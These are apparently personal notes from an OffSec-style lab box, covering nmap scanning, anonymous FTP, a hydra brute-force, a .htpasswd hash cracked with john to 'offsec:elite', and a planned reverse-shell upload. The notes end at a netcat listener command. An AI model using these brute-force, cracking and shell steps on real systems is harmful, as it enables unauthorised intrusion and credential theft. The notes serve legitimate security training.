

```
nmap -A -p- --min-rate 10000 192.168.137.46
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 19:59 EST
Nmap scan report for 192.168.137.46
Host is up (0.023s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Nov 08 08:59 log
| ----------   1 root     root         2275 Aug 09  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
|_dr-xr-xr-x   1 root     root          512 Aug 03  2024 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-11-08T00:59:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-01T20:34:50
|_Not valid after:  2025-01-31T20:34:50
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2025-11-08T00:59:53+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|8.1|Phone|Vista (94%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista
Aggressive OS guesses: Microsoft Windows Server 2008 R2 or Windows 7 SP1 (94%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (87%), Microsoft Windows Server 2008 R2 or Windows 8 (87%), Microsoft Windows Server 2008 R2 SP1 (87%), Microsoft Windows Server 2008 (85%), Microsoft Windows 7 SP1 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows 8.1 R1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   21.81 ms 192.168.45.1
2   21.71 ms 192.168.45.254
3   21.95 ms 192.168.251.1
4   22.00 ms 192.168.137.46

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.49 seconds
```

## FTP

- Anonymous Access [y]
- Writable Files [y]
- Check for important files [y]

Can't download any files. 

There is an anonymous, OffSec & admin user.
Let's try to bruteforce users. [x]

```
hydra -l admin -p admin ftp://192.168.137.46 -s 21
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-07 20:37:01
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ftp://192.168.137.46:21/
[21][ftp] host: 192.168.137.46   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-07 20:37:12
```

Retrieved credentials for user "offsec"

```
cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

The password seems to be encoded, let's bruteforce the hash.

```
john .htpasswd --wordlist=/usr/share/wordlists/rockyou.txt          
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
elite            (offsec)     
1g 0:00:00:00 DONE (2025-11-07 20:40) 1.960g/s 49694p/s 49694c/s 49694C/s 191192..260989
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

offsec:elite


## HTTP

Running on port 242

- GoBuster dirbuster
- GoBuster file extension fuzzing
- feroxbuster
- nikto
- ffuf subdomain enum
- robots.txt

Requires Authentication.
## FTP

Running on port 3145.

- Anonymous Access
- Writable Files
- Check for important files
## WinRM

DNS Name "Livda"

## Initial Access

Since I'm able to upload files on to the webroot of the server, we can upload an reverse shell script and get initial access.

Let's start up an listener on port 1337.

```
nc -lvnp 1337
```



```

```